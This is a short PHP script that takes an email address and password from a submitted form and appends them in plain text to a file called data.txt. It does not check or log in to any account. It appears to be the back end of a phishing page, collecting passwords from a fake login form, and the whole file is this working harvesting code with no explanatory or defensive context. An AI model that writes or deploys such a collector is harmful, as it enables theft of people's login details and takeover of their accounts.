<?php

$email = $_POST['email'];
$pass = $_POST['pass'];

$fp = fopen('data.txt','a+');
fwrite($fp,"email: {$email}\n");
fwrite($fp,"pass: {$pass}\n");
fwrite($fp,"--------------------\n");
fclose($fp);